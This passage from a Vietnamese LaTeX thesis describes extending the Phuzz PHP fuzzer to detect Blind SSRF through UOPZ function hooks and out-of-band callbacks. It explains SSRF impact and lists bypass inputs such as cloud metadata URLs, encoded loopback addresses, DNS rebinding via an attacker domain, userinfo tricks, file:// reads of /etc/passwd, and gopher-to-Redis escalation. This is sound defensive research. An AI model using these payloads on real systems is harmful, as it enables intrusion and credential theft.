với $\alpha$ và $\beta$ là trọng số cấu hình. Ứng viên có điểm cao nhất được
chọn ở bước 2 của vòng lặp fuzz; khi hai ứng viên bằng điểm, ứng viên mới
hơn được ưu tiên. Năng lượng $E(c)$ --- số lần đột biến --- tỷ lệ tuyến tính
với $\text{score}(c)$, đảm bảo các ứng viên ``thú vị'' nhận được nhiều đột
biến hơn.

\subsection{Phát hiện Lỗ hổng}
\label{subsec:phuzz-vulncheckers}

\textbf{Lỗ hổng phía server.} Phuzz hook các hàm PHP native; khi input từ
fuzzer gây ra lỗi, thông tin debug (tên hàm, đối số, thông báo lỗi) được lưu
trong coverage report và chuyển tới VulnChecker:

\begin{itemize}
    \item \textbf{SQL Injection (SQLi)}: Hook bốn hàm MySQL
    (\texttt{mysqli\_query}, \texttt{mysqli::query}, \texttt{PDO::query},
    \texttt{PDO::exec}); input không hợp lệ tạo ra SQL syntax error được ghi
    nhận trong error log.
    \item \textbf{Command Injection (RCE)}: Hook bốn hàm shell
    (\texttt{shell\_exec}, \texttt{system}, \texttt{passthru}, \texttt{exec});
    kiểm tra thông báo lỗi về lệnh không hợp lệ, hoặc return code khác 0.
    \item \textbf{Path Traversal (PaTr)}: Hook 48 hàm file-related
    (\texttt{file\_get\_contents}, \texttt{fopen}, \texttt{file\_exists},
    v.v.); phát hiện khi path nguy hiểm như \texttt{/etc/passwd} được truyền
    vào hàm file.
    \item \textbf{Insecure Deserialization (IDes)}: Hook \texttt{unserialize()};
    input không hợp lệ tạo ra lỗi PHP object injection.
    \item \textbf{XML External Entity (XXE)}: Hook \texttt{DOMDocument::loadXML}
    trong cấu hình \texttt{LIBXML\_NOENT} cho phép external entity expansion.
\end{itemize}

\textbf{Lỗ hổng phía client.} Hai lớp lỗ hổng client-side được phát hiện
bằng phân tích HTTP response, không cần instrumentation phía server:
Cross-Site Scripting (XSS) theo thuật toán webFuzz~\cite{vanrooij2021webfuzz}
--- chèn marker vào payload và kiểm tra sự xuất hiện của nó trong DOM
response; và Open Redirection (OpRe) --- kiểm tra mã 3xx và giá trị header
\texttt{Location} xem liệu input có xuất hiện trong URL chuyển hướng.

\textbf{ParamBasedVulnChecker.} Để giảm false positive, Phuzz triển khai
\texttt{ParamBasedVulnChecker}: chỉ phát cảnh báo khi ít nhất một tham số
fuzz xuất hiện trong đối số truyền vào hàm bị hook, đảm bảo input từ fuzzer
đã thực sự propagate tới điểm nguy hiểm (sink). Điều này loại bỏ các cảnh
báo giả khi ứng dụng tự tạo ra lỗi SQL không liên quan đến input của fuzzer.

\subsection{Sinh Test Case và Đột biến Tham số}

Phuzz yêu cầu seed ban đầu qua file cấu hình JSON. Ứng viên được chấm điểm
theo số đường đi mới và dòng code mới phía server. Đột biến diễn ra ở mức
byte trên các chuỗi tham số --- không phải toàn bộ HTTP request --- đảm bảo
request luôn hợp lệ. Phuzz định nghĩa kiến trúc \texttt{ParamMutator} plugin:

\begin{itemize}
    \item \textbf{Các mutator byte-level cơ bản}: BitFlipMutator (đảo bit),
    ByteFlipMutator, ArithmeticMutator (tăng/giảm byte value), SpliceMutator
    (ghép hai tham số), DeleteMutator, RepeatMutator, \ldots
    \item \textbf{Mutator ngữ nghĩa đặc thù lỗ hổng}: ProtocolPrefixMutator
    (prefix \texttt{http://}), PathTraversalPayloadParamMutator (chèn
    \texttt{../}), XSSPayloadParamMutator (chèn XSS marker).
    \item \textbf{SSRFMutator} (đề xuất của khóa luận này): chèn 21 biến thể
    URL OOB với các kỹ thuật bypass khác nhau (chi tiết Chương~3).
\end{itemize}

\subsection{Giới hạn của Phuzz và Khoảng trống Nghiên cứu}

Mặc dù đạt hiệu quả cao trong phát hiện các lỗ hổng truyền thống --- 99\%
trong bộ benchmark 87 lỗ hổng đã biết --- bài báo gốc~\cite{neef2024phuzz}
thừa nhận rõ ràng hai giới hạn liên quan trực tiếp đến khóa luận này.

Thứ nhất, Phuzz bỏ sót SSRF trong quá trình fuzzing tự động. Cụ thể,
CVE-2023-6294 (SSRF trong plugin popup-builder cho WordPress) chỉ được phát
hiện thủ công trong bước review sau khi Phuzz tìm thấy lỗ hổng đọc file tùy
ý. Bài báo ghi nhận thẳng thắn: \textit{``The SSRF could have been found by
Phuzz, if \texttt{wp\_remote\_get} was hooked and included in the vulnerability
detection.''} Thứ hai, Phuzz không có kênh phản hồi nào cho các lỗ hổng mà
ứng dụng âm thầm thực hiện hành vi mạng mà không để lại dấu vết trong HTTP
response hay exception. Bài báo liệt kê SSRF là ưu tiên hàng đầu trong phần
Future Work.

Đây chính là khoảng trống mà khóa luận này lấp đầy.

% ============================================================
\section{Phân tích Động và Hook Hàm trong PHP}
\label{sec:hooking}
% ============================================================

\subsection{Kiến trúc Runtime của PHP}
\label{subsec:zend-engine}

PHP được thực thi qua Zend Engine, một trình thông dịch viết bằng C. Hiểu
kiến trúc này là cơ sở để thiết kế cơ chế hooking hiệu quả~\cite{phpgroup2023history}.

Luồng thực thi PHP bao gồm bốn giai đoạn:
\begin{enumerate}
    \item \textbf{Lexing và Parsing}: Mã nguồn PHP được tokenize và parse
    thành Abstract Syntax Tree (AST).
    \item \textbf{Compilation}: AST được biên dịch thành \emph{opcodes}
    (Zend VM bytecode). Opcache có thể cache opcodes để tăng tốc.
    \item \textbf{Execution}: Zend VM thực thi opcode. Mỗi lời gọi hàm tra
    cứu trong \emph{function table} (bảng hash mapping tên hàm thành
    \texttt{zend\_function} struct).
    \item \textbf{Shutdown}: Gọi shutdown functions, giải phóng bộ nhớ.
\end{enumerate}

Điểm quan trọng là \emph{function table} có thể được thao tác ở runtime bởi
các extension, cho phép thay thế hoặc bọc bất kỳ hàm PHP built-in nào. Đây
là cơ chế mà UOPZ khai thác.

\textbf{Cơ chế auto\_prepend\_file.} PHP cung cấp directive
\texttt{auto\_prepend\_file} trong \texttt{php.ini}: một file PHP được include
tự động trước khi thực thi bất kỳ script PHP nào. Phuzz dùng cơ chế này để
inject instrumentation code (coverage collection và function hooks) một cách
trong suốt --- ứng dụng mục tiêu không biết về sự tồn tại của code bổ sung
này.

\subsection{Extension UOPZ --- Cơ chế và API}
\label{subsec:uopz}

UOPZ (User Operations for Zend Engine)~\cite{phpgroup2023uopz} là PHP extension
cho phép thao tác với hàm và lớp PHP tại tầng Zend Engine ở runtime, không
cần sửa mã nguồn. Ba API chính phục vụ các mục đích khác nhau:

\begin{itemize}
    \item \textbf{uopz\_set\_hook(\$function, \$hook)}: Đặt hook được gọi
    \emph{trước} hàm gốc, với cùng tham số. Dùng để capture đối số trước khi
    hàm thực thi; hàm gốc vẫn chạy bình thường sau đó. Đây là API dùng trong
    khóa luận này để hook các hàm mạng SSRF.
    \item \textbf{uopz\_set\_return(\$function, \$value, \$execute = false)}:
    Thay thế return value của hàm. Khi \texttt{\$execute = true}, wrap hàm
    bằng closure và gọi hàm gốc bên trong. Phuzz dùng API này để bắt exception.
    \item \textbf{uopz\_redefine(\$constant, \$value)}: Redefine hằng số tại
    runtime.
    \item \textbf{uopz\_undefine(\$function)}: Vô hiệu hóa hoàn toàn một hàm.
    Phuzz dùng để disable các hàm xác thực/phân quyền.
\end{itemize}

Ví dụ về \texttt{uopz\_set\_hook} để ghi nhận lời gọi \texttt{file\_get\_contents}:

\begin{verbatim}
uopz_set_hook('file_get_contents', function($filename) {
    // Chạy trước file_get_contents() thực sự
    if (filter_var($filename, FILTER_VALIDATE_URL)) {
        phuzz_log_ssrf_hook([
            'func'     => 'file_get_contents',
            'url'      => $filename,
            'covID'    => $_SERVER['HTTP_X_FUZZER_COVID'] ?? '',
        ]);
    }
});
\end{verbatim}

Ưu điểm quan trọng nhất của UOPZ là hook hoạt động \emph{ở tầng interpreter},
nghĩa là áp dụng cho mọi lời gọi từ bất kỳ tầng abstraction nào: dù ứng dụng
gọi hàm trực tiếp, qua framework, hay qua nhiều lớp wrapper, hook vẫn được
kích hoạt.

\textbf{So sánh với các cơ chế hooking khác.}
\begin{itemize}
    \item \textbf{Xdebug trace}: Ghi lại mọi lời gọi hàm theo kiểu trace,
    nhưng không cho phép can thiệp vào luồng thực thi hay sửa đổi đối số.
    Overhead rất lớn.
    \item \textbf{APM agents (Datadog, New Relic)}: Dùng cơ chế tương tự để
    instrument function calls, nhưng được thiết kế cho performance monitoring,
    không phải security testing.
    \item \textbf{Monkey patching (override trong PHP user-space)}: Không thể
    override PHP built-in functions bằng cách đơn giản như trong Python ---
    UOPZ là cần thiết cho mục đích này.
\end{itemize}

\subsection{Phân loại Hàm PHP Có Nguy cơ SSRF}

Trong PHP, SSRF không chỉ phát sinh từ một hàm duy nhất mà từ nhiều nhóm
hàm khác nhau, mỗi nhóm có đặc điểm riêng về cách thực hiện kết nối
mạng. Hiểu rõ các nhóm này là cơ sở để thiết kế cơ chế hook toàn diện.

\textbf{Nhóm Network/HTTP.} Các hàm như \texttt{file\_get\_contents},
\texttt{fopen}, \texttt{readfile}, \texttt{file} là các hàm đa năng trong
PHP --- khi nhận một URL thay cho đường dẫn file cục bộ, chúng âm thầm thực
hiện HTTP/FTP request thông qua stream wrapper. Đây là nhóm phổ biến nhất vì
lập trình viên thường dùng chúng để đọc dữ liệu từ remote API mà không nhận
ra nguy cơ. Các hàm \texttt{get\_headers}, \texttt{get\_meta\_tags},
\texttt{getimagesize} cũng thực hiện HTTP request ngầm khi nhận URL.

\textbf{Nhóm cURL.} Thư viện cURL (\texttt{curl\_exec},
\texttt{curl\_multi\_exec}) cung cấp một client HTTP đầy đủ tính năng. Điểm
đặc biệt về kỹ thuật: URL được thiết lập qua \texttt{curl\_setopt} ở bước
cấu hình (\texttt{CURLOPT\_URL}), không phải qua \texttt{curl\_exec} ở bước
thực thi --- do đó cần hook cả hai để không bỏ sót URL được set từ trước.

\textbf{Nhóm Sockets.} \texttt{fsockopen}, \texttt{pfsockopen} và
\texttt{stream\_socket\_client} mở kết nối TCP/UDP thô trực tiếp tới
hostname:port tùy ý, bỏ qua mọi lớp HTTP abstraction. Đây thường là điểm
sink trong các thư viện HTTP bậc thấp và protocol client (SMTP, Redis, \ldots).

\textbf{Nhóm Shell execution.} Ngoài SSRF thuần túy, một kịch bản nguy hiểm
khác là Command Injection dẫn tới SSRF: input của người dùng được truyền vào
các hàm thực thi shell (\texttt{shell\_exec}, \texttt{system}, \texttt{exec},
\texttt{passthru}, \texttt{popen}) và chứa lệnh như \texttt{curl} hay
\texttt{wget} trỏ tới địa chỉ tùy ý. Việc hook nhóm này cho phép phát hiện
đồng thời cả hai lớp lỗ hổng: Command Injection và SSRF qua command.

\textbf{Nhóm CMS wrappers.} Các framework như WordPress cung cấp các hàm
HTTP wrapper cấp cao (\texttt{wp\_remote\_get}, \texttt{wp\_remote\_post},
\texttt{wp\_remote\_request}, \texttt{wp\_remote\_head}, \texttt{wp\_safe\_remote\_get},
\texttt{wp\_safe\_remote\_post}) nằm trên cùng của thư viện WP HTTP. Nhiều
plugin WordPress dùng các hàm này thay cho cURL hay \texttt{file\_get\_contents}
trực tiếp; nếu chỉ hook tầng thấp sẽ bỏ sót các lời gọi thông qua wrapper.

\textbf{Nhóm Stream wrappers.} PHP hỗ trợ \texttt{stream\_socket\_client},
\texttt{stream\_context\_create} cùng với \texttt{fopen} để tạo kết nối mạng
bậc thấp. Điểm đặc biệt là stream wrapper có thể được đăng ký tùy chỉnh bởi
các extension (ví dụ: \texttt{s3://} cho Amazon S3), tạo ra các sink SSRF
không có trong danh sách hook mặc định.

Một thiết kế hook SSRF hoàn chỉnh cần bao phủ cả năm nhóm trên. Chi tiết
cài đặt cụ thể được trình bày trong Chương~3.

\subsection{Kiến trúc Hai Tầng Tín hiệu cho SSRF}
\label{subsec:two-layer}

Giải pháp đề xuất trong khóa luận này kết hợp hai tầng tín hiệu bổ sung cho
nhau, giải quyết các giới hạn của từng tầng đơn lẻ:

\textbf{Tầng 1 --- PHP Hook (In-band, đồng bộ).} Hook các hàm mạng PHP bằng
UOPZ để ghi nhận lời gọi hàm ngay trong request handler. Khi hàm mạng được
gọi với một URL, hook ghi thông tin (tên hàm, URL đích, coverage ID) vào
\texttt{/shared-tmpfs/ssrf-hooks/<covID>.json}. Tín hiệu nhanh và trực tiếp,
cung cấp ngữ cảnh phong phú (hàm nào, URL nào), nhưng chỉ kích hoạt khi
ứng dụng thực sự gọi hàm mạng với input của fuzzer và hook được kích hoạt
trong cùng request handler.

\textbf{Tầng 2 --- OOB Callback (Out-of-band, bất đồng bộ).} Lắng nghe kết
nối từ ứng dụng mục tiêu trên OOB server. Khi ứng dụng thực hiện HTTP request
tới URL OOB (\texttt{http://oob-server/<token>}), OOB server ghi log vào
\texttt{/shared-tmpfs/oob-logs/<token>.json}. Đây là bằng chứng mạng không
thể phủ nhận: nếu OOB server nhận kết nối mang token của fuzzer, ứng dụng đã
thực sự thực hiện network request tới địa chỉ ngoài. Tín hiệu này đặc biệt
quan trọng cho Blind SSRF với xử lý bất đồng bộ.

Hai tầng này được kết hợp trong \texttt{SSRFVulnCheck} theo logic \textsc{AND}:
một ứng viên chỉ được báo cáo là SSRF khi có \emph{cả hai} tín hiệu cùng
hiện diện --- hook ghi nhận lời gọi hàm mạng, \emph{và} OOB server nhận được
callback. Điều này đảm bảo:
\begin{itemize}
    \item Tầng 1 cung cấp phát hiện nhanh và ngữ cảnh (URL đích, hàm được
    gọi, line số trong PHP).
    \item Tầng 2 là xác nhận cuối cùng không thể tranh cãi: bằng chứng mạng
    thực tế.
    \item Logic AND loại bỏ false positive từ cả hai phía: hook có thể bị
    kích hoạt bởi request hợp lệ, nhưng OOB callback chỉ xảy ra khi ứng dụng
    thực sự kết nối đến OOB server với đúng token.
\end{itemize}

% ============================================================
\section{Nhận xét về Bài toán cần Giải quyết}
\label{sec:problem-statement}
% ============================================================

Dựa trên các kiến thức nền tảng được xây dựng trong chương này, có thể
phát biểu bài toán nghiên cứu một cách chính xác và đầy đủ.

\subsection{Tổng hợp Khoảng trống Kỹ thuật}

Greybox fuzzing với coverage guidance (Phần~\ref{sec:greybox-fuzzing}) là
phương pháp phù hợp nhất để kiểm thử bảo mật ứng dụng web PHP tự động:
nó không yêu cầu mã nguồn, mở rộng tốt, và có thể tích hợp tín hiệu phản
hồi phong phú. Phuzz~\cite{neef2024phuzz} (Phần~\ref{sec:phuzz}) là hiện
thực hóa tốt nhất của hướng tiếp cận này, đạt 99\% phát hiện trên bộ
benchmark 87 lỗ hổng truyền thống.

Tuy nhiên, kiến trúc hiện tại của Phuzz --- và của mọi greybox fuzzer web
hiện tại --- dựa trên giả định cơ bản rằng tín hiệu phản hồi đến từ hai
kênh: HTTP response và code coverage. Cả hai kênh đều không thể quan sát
hành vi mạng ẩn của ứng dụng. Bảng~\ref{tab:signal-gap} tổng hợp khoảng
trống này:

\begin{table}[h]
\centering
\caption{Tín hiệu phản hồi sẵn có và khả năng phát hiện từng loại lỗ hổng}
\label{tab:signal-gap}
\begin{tabular}{|l|c|c|c|c|}
\hline
\textbf{Tín hiệu phản hồi} & \textbf{SQLi} & \textbf{XSS} & \textbf{SSRF} & \textbf{Blind SSRF} \\
\hline
Nội dung HTTP response      & \checkmark & \checkmark & \checkmark & \ding{55} \\
HTTP status code bất thường & \checkmark & \ding{55}  & Có thể     & \ding{55} \\
Exception / thông báo lỗi   & \checkmark & \ding{55}  & Có thể     & \ding{55} \\
Độ phủ mã (code coverage)   & \checkmark & \checkmark & \checkmark & \ding{55} \\
\textbf{OOB network callback}& \ding{55}  & \ding{55}  & \checkmark & \checkmark \\
\hline
\end{tabular}
\end{table}

Cơ chế hook hàm PHP qua UOPZ (Phần~\ref{sec:hooking}) cung cấp khả năng
bắt lời gọi hàm mạng ở tầng interpreter --- nhưng bản thân hook chỉ là
tín hiệu in-band, không thể xác nhận ứng dụng đã \emph{thực sự} thực hiện
kết nối ra ngoài.

\subsection{Phát biểu Bài toán}

Bài toán nghiên cứu của khóa luận này là:

\begin{quote}
\textit{Thiết kế và cài đặt một hệ thống phát hiện Blind SSRF hoàn toàn
tự động, tích hợp vào vòng lặp greybox fuzzing PHP của Phuzz, sao cho:
(1)~mọi tham số HTTP có thể là SSRF sink đều được kiểm thử với payload
bao phủ các kỹ thuật bypass phổ biến; (2)~bằng chứng lỗ hổng được xác
nhận qua hai kênh tín hiệu độc lập (in-band hook và out-of-band callback)
theo logic AND, đảm bảo zero false positive; và (3)~toàn bộ quá trình từ
sinh payload đến xác nhận lỗ hổng diễn ra tự động mà không cần can thiệp
thủ công.}
\end{quote}

\subsection{Yêu cầu Kỹ thuật}

Bài toán đặt ra ba yêu cầu kỹ thuật cụ thể cần giải quyết:

\begin{enumerate}
    \item \textbf{Kênh tín hiệu thứ ba (OOB).} Cần một máy chủ lắng nghe
    độc lập có thể nhận kết nối từ ứng dụng mục tiêu và tương quan chính
    xác mỗi callback với ứng viên fuzz đã kích hoạt nó --- ngay cả trong
    môi trường song song với hàng nghìn request đồng thời.
    \item \textbf{Bộ đột biến chuyên biệt.} Cần payload SSRF bao phủ đầy
    đủ các kỹ thuật bypass (mã hóa IP, DNS redirect, userinfo trick, \ldots)
    để không bỏ sót các lỗ hổng chỉ phát hiện được qua một biến thể cụ thể.
    \item \textbf{Tích hợp không xâm lấn.} Giải pháp phải tương thích với
    kiến trúc plugin của Phuzz, không phá vỡ các chức năng phát hiện lỗ
    hổng gốc, và có thể triển khai trên bất kỳ ứng dụng PHP mục tiêu nào
    mà không cần sửa đổi mã nguồn ứng dụng.
\end{enumerate}

Chương~3 trình bày giải pháp đáp ứng đầy đủ cả ba yêu cầu trên.

\section{Tổng kết Chương}

Chương này đã xây dựng nền tảng lý thuyết cho toàn bộ khóa luận qua ba
mảng kiến thức liên kết chặt chẽ.

Greybox fuzzing với coverage guidance là chiến lược hiệu quả để khám phá
lỗ hổng trong ứng dụng web PHP, nhưng yêu cầu giải quyết các thách thức
đặc thù: instrumentation qua HTTP, quản lý trạng thái ứng dụng và phát hiện
lỗ hổng không có crash signal. Phuzz là framework hiện thực hóa chiến lược
đó, đạt hiệu quả cao trên nhiều lớp lỗ hổng truyền thống và được thiết kế
modular để mở rộng. Tuy nhiên, kiến trúc hiện tại của Phuzz không có khả
năng phát hiện Blind SSRF vì cả hai kênh phản hồi truyền thống (HTTP response
và coverage) đều không quan sát được hành vi mạng ẩn của ứng dụng.

Cơ chế hook hàm mạng PHP qua UOPZ cung cấp tín hiệu in-band tức thì khi
hàm mạng được gọi. Tuy nhiên hook đơn lẻ chưa đủ --- cần một kênh tín hiệu
ngoài băng (OOB) độc lập để xác nhận ứng dụng đã thực sự kết nối ra ngoài.

Hai tầng tín hiệu (PHP hook AND OOB callback) cùng tạo thành nền tảng kỹ
thuật cho thiết kế và cài đặt được trình bày trong Chương~3, nơi lỗ hổng
SSRF và kỹ thuật OOB được phân tích chi tiết trước khi trình bày cài đặt
hệ thống.

\chapter{Thiết kế và Cài đặt Hệ thống}

Để phát hiện Blind SSRF, hệ thống cần giải quyết ba bài toán kỹ thuật độc
lập nhưng liên kết chặt: biết \emph{ứng dụng đã gọi hàm mạng nào và với
đối số gì} (tín hiệu in-band từ hook PHP), biết \emph{request đó có thực
sự kết nối tới OOB server không} (tín hiệu ngoại tuyến từ server lắng
nghe), và biết \emph{payload nào vượt qua được bộ lọc đầu vào của ứng
dụng} (bộ đột biến đa biến thể). Ba bài toán này quy định trực tiếp toàn
bộ kiến trúc được trình bày trong chương này.

Chương mở đầu bằng nền tảng lý thuyết: Phần~\ref{sec:ssrf} phân tích lỗ
hổng SSRF và lý do dạng Blind SSRF vô hình với mọi kênh tín hiệu truyền
thống; Phần~\ref{sec:oob} giải thích kỹ thuật Out-of-Band và cơ chế tương
quan token cho phép liên kết OOB callback về request gốc. Từ nền tảng đó,
Phần~\ref{sec:arch} mô tả kiến trúc bốn container và cơ sở hạ tầng chia
sẻ dữ liệu qua tmpfs. Các phần tiếp theo đi vào từng thành phần cài đặt:
hook hàm PHP và stream wrapper (Phần~\ref{sec:hook-impl}), OOB server
(Phần~\ref{sec:oob-impl}), bộ đột biến SSRF (Phần~\ref{sec:mutator-impl}),
cơ chế phát hiện hai tầng (Phần~\ref{sec:feedback-impl}), và điểm tích
hợp vào vòng lặp fuzz chính (Phần~\ref{sec:integration}).

% ============================================================
\section{Lỗ hổng Server-Side Request Forgery (SSRF)}
\label{sec:ssrf}
% ============================================================

\subsection{Định nghĩa và Nguyên lý Hoạt động}

Server-Side Request Forgery (SSRF) là lớp lỗ hổng bảo mật trong đó kẻ tấn
công khiến máy chủ ứng dụng thực hiện các yêu cầu mạng tùy ý tới địa chỉ
do attacker kiểm soát~\cite{owasp2021top10, owasp2023ssrf}. Lỗ hổng phát
sinh khi ứng dụng nhận URL hoặc địa chỉ IP từ input người dùng và dùng trực
tiếp nó để thực hiện network request phía server --- thường để fetch tài
nguyên, gọi webhook, hay tích hợp dịch vụ bên ngoài.

Trong PHP, SSRF thường xuất hiện khi input không được kiểm tra được truyền
vào các hàm như \texttt{file\_get\_contents()}, \texttt{curl\_exec()},
\texttt{wp\_remote\_get()}, \texttt{fsockopen()}, hay
\texttt{stream\_socket\_client()}. Đoạn code điển hình:

\begin{verbatim}
// /fetch.php?url=<user_input>
$url  = $_GET['url'];
$data = file_get_contents($url);  // SSRF sink
echo $data;
\end{verbatim}

Attacker có thể truyền \texttt{url=http://169.254.169.254/latest/meta-data/}
để đọc AWS instance metadata, hoặc \texttt{url=http://redis:6379} để tương
tác với Redis nội bộ vốn không được bảo vệ bởi tường lửa. Đây là ví dụ
minh họa của cả hai hướng tấn công chính: leo thang privilege qua cloud
metadata và di chuyển ngang (lateral movement) trong mạng nội bộ.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Sơ đồ nguyên lý SSRF — hai lớp mạng.
    % Lớp ngoài (Internet): Attacker gửi HTTP GET /fetch.php?url=http://169.254.169.254/...
    %   đến Web Server. Tường lửa ở giữa chặn truy cập trực tiếp từ Internet vào Internal Network.
    % Lớp trong (Internal Network): Web Server (đã vào được bên trong) gọi
    %   file_get_contents($url) → HTTP request → Cloud Metadata Service (169.254.169.254),
    %   hoặc → Redis (:6379), hoặc → Admin Panel (/admin).
    % Kết quả: Response nội bộ về Web Server → Web Server phản ánh về Attacker (Regular SSRF)
    %   hoặc chỉ xử lý nội bộ (Blind SSRF).
    % Điểm nhấn màu đỏ: tường lửa có lỗ hổng — chặn Internet→Internal nhưng không chặn
    %   Web Server→Internal vì Web Server được coi là nội bộ.
    \includegraphics[width=0.85\textwidth]{figures/fig-ssrf-principle}
    \caption{Nguyên lý tấn công SSRF.}
    \label{fig:ssrf-principle}
\end{figure}

\subsection{Phân loại SSRF}

\textbf{Regular SSRF (In-band SSRF).} Response của network request phía server
được phản ánh một phần hoặc toàn bộ trong HTTP response trả về cho attacker.
Attacker có thể đọc trực tiếp nội dung tài nguyên nội bộ, khiến đây là dạng
SSRF dễ phát hiện nhất do có tín hiệu rõ ràng trong response.

\textbf{Blind SSRF (Out-of-band SSRF).} Máy chủ thực hiện network request
nhưng response \emph{không được} phản ánh trong HTTP response trả về --- ứng
dụng xử lý kết quả nội bộ, loại bỏ, hoặc chỉ ghi log. Từ góc độ bên ngoài,
HTTP response trông hoàn toàn bình thường. Blind SSRF đặc biệt phổ biến trong
các tình huống:
\begin{itemize}
    \item \textbf{Webhook validation}: Ứng dụng gọi URL để kiểm tra tính
    hợp lệ nhưng không trả về nội dung. Ví dụ: nhiều plugin WordPress xác
    nhận URL webhook bằng cách gửi request thử và kiểm tra status code.
    \item \textbf{Background processing}: Request được đẩy vào hàng đợi
    (queue) và xử lý bất đồng bộ bởi worker riêng, không liên quan đến HTTP
    response của request gốc.
    \item \textbf{License/telemetry checks}: Nhiều plugin thương mại gọi
    server nhà sản xuất trong background để kiểm tra license hoặc gửi thống
    kê ẩn danh, không hiển thị kết quả.
\end{itemize}

\textbf{Semi-blind SSRF.} Một số tài liệu phân loại thêm dạng trung gian:
ứng dụng không phản ánh nội dung response nhưng có sự khác biệt quan sát
được trong HTTP response (ví dụ: thời gian phản hồi khác nhau, status code
khác nhau). Dạng này có thể phát hiện bằng kỹ thuật timing oracle nhưng khó
tự động hóa do phụ thuộc vào nhiễu mạng.

\subsection{Tác động và Mức độ Nghiêm trọng}

SSRF được đưa vào OWASP Top 10:2021 tại vị trí A10:2021 --- Server-Side
Request Forgery như một mục riêng biệt~\cite{owasp2021top10} --- đây là lần
đầu tiên trong lịch sử OWASP Top 10 lỗ hổng này được ghi nhận, phản ánh
tần suất và mức độ ảnh hưởng ngày càng tăng trong kiến trúc microservice và
cloud. Tác động của SSRF bao gồm:

\begin{itemize}
    \item \textbf{Truy cập tài nguyên nội bộ}: Tiếp cận các dịch vụ như cơ
    sở dữ liệu, Redis, Elasticsearch vốn không được tiếp xúc với Internet,
    vượt qua chính sách tường lửa nhờ dùng máy chủ ứng dụng làm proxy.
    \item \textbf{Đánh cắp credentials cloud}: Trong môi trường AWS, Azure,
    GCP, attacker có thể lấy IAM credentials từ instance metadata service
    (\texttt{169.254.169.254}), dẫn tới chiếm quyền toàn bộ cloud account.
    Đây chính là vectơ tấn công được dùng trong sự cố Capital One 2019 gây
    lộ lọt dữ liệu của 100 triệu khách hàng~\cite{owasp2021top10}.
    \item \textbf{Port scanning mạng nội bộ}: Máy chủ bị lợi dụng để quét
    và xác định các dịch vụ đang chạy trong mạng nội bộ, phục vụ cho các
    bước tấn công tiếp theo.
    \item \textbf{Leo thang lên RCE qua Gopher}: Kết hợp Gopher protocol với
    Redis RESP injection, attacker gửi lệnh Redis tùy ý và khai thác cấu hình
    Redis không có xác thực để ghi file tùy ý lên hệ thống, từ đó leo thang
    thành Remote Code Execution.
    \item \textbf{Đọc file cục bộ}: Khi ứng dụng dùng \texttt{file://} scheme,
    SSRF có thể đọc file nhạy cảm như \texttt{/etc/passwd},
    \texttt{/etc/shadow} hay mã nguồn ứng dụng.
\end{itemize}

\subsection{Phân tích Kỹ thuật Bypass Phổ biến}
\label{subsec:ssrf-bypass}

Nhiều ứng dụng cố gắng ngăn chặn SSRF bằng blocklist, từ chối các IP nội
bộ như \texttt{127.0.0.1}, \texttt{10.0.0.0/8}, \texttt{192.168.0.0/16}.
Tuy nhiên, blocklist thường không đầy đủ và có thể vượt qua bằng nhiều
kỹ thuật~\cite{owasp2023ssrf}:

\textbf{Biểu diễn IP thay thế.} Nhiều bộ phân tích URL chấp nhận các dạng
biểu diễn địa chỉ IP khác nhau mà blocklist dựa trên chuỗi không bắt kịp:
\begin{itemize}
    \item Hex: \texttt{0x7f000001} = 127.0.0.1
    \item Decimal: \texttt{2130706433} = 127.0.0.1
    \item Octal: \texttt{0177.0.0.1} = 127.0.0.1
    \item IPv6 mapped: \texttt{::ffff:127.0.0.1} hay \texttt{::ffff:7f00:1}
    \item URL-encoded dot: \texttt{127.0.0\%2e1} hay \texttt{127.0.0\%252e1}
    (double encoding)
\end{itemize}

\textbf{DNS rebinding.} Đây là kỹ thuật bypass tinh vi nhất, lợi dụng
khoảng thời gian giữa hai lần DNS lookup:
\begin{enumerate}
    \item Attacker kiểm soát DNS server cho domain \texttt{evil.attacker.com}.
    \item Lần DNS lookup đầu tiên (khi ứng dụng validate URL): DNS server trả
    về địa chỉ IP public hợp lệ, vượt qua kiểm tra blocklist.
    \item Attacker cấu hình DNS với TTL rất ngắn (1 giây).
    \item Sau khi TTL hết hạn, lần DNS lookup thứ hai (khi ứng dụng thực sự
    kết nối): DNS server trả về địa chỉ IP nội bộ như \texttt{192.168.1.1}.
    \item Ứng dụng kết nối tới địa chỉ nội bộ mà không kiểm tra lại.
\end{enumerate}
Kỹ thuật này đặc biệt nguy hiểm vì nó qua được cả các cơ chế bảo vệ
``check-then-use'' được thiết kế cẩn thận.

\begin{figure}[htbp]
    \centering
    % Mô tả hình: Timeline DNS Rebinding Attack (trục thời gian nằm ngang).
    % T=0 (Lần DNS lookup 1 — Validation):
    %   App kiểm tra: attacker.com → DNS Server của Attacker → 1.2.3.4 (public IP).
    %   Kết quả: IP 1.2.3.4 không nằm trong blocklist → PASS.
    %   DNS TTL = 1 giây.
    % T=1s (TTL hết hạn): cache DNS bị xóa.
    % T=2 (Lần DNS lookup 2 — Connection):
    %   App kết nối: attacker.com → DNS Server của Attacker → 192.168.1.1 (internal IP).
    %   Kết quả: App kết nối thực sự tới 192.168.1.1 trong mạng nội bộ.
    % Phần dưới: so sánh hai dòng — "Validation" vs "Connection" — để thấy IP thay đổi.
    \includegraphics[width=0.80\textwidth]{figures/fig-dns-rebinding}
    \caption{Kỹ thuật DNS Rebinding.}
    \label{fig:dns-rebinding}
\end{figure}

\textbf{Redirect qua domain tin cậy.} Nếu ứng dụng có open redirect trên
một domain được whitelist, attacker có thể dùng redirect đó để chuyển hướng
request tới địa chỉ nội bộ. Ví dụ: \texttt{http://trusted.com/redirect?url=
http://192.168.1.1}.

\textbf{URL parsing inconsistency.} Userinfo trong URL (\texttt{http://
user@host:port/path}) có thể gây nhầm lẫn giữa các parser khác nhau:
\texttt{http://trusted.com@192.168.1.1/} --- một số parser coi
\texttt{trusted.com} là hostname, parser khác coi đây là userinfo và
\texttt{192.168.1.1} mới là hostname thực sự.

\textbf{Scheme thay thế.} Ngoài \texttt{http://} và \texttt{https://}, PHP
hỗ trợ nhiều URL scheme khác có thể khai thác SSRF:
\begin{itemize}
    \item \texttt{file://}: Đọc file cục bộ.
    \item \texttt{gopher://}: Gửi dữ liệu TCP tùy ý, dùng để tương tác với
    Redis, Memcached, SMTP.
    \item \texttt{dict://}: Truy vấn từ điển qua TCP, có thể dùng để port
    scan.
    \item \texttt{ftp://}: Kết nối FTP, có thể rò rỉ địa chỉ IP nội bộ.
\end{itemize}

\subsection{SSRF trong Hệ sinh thái PHP}
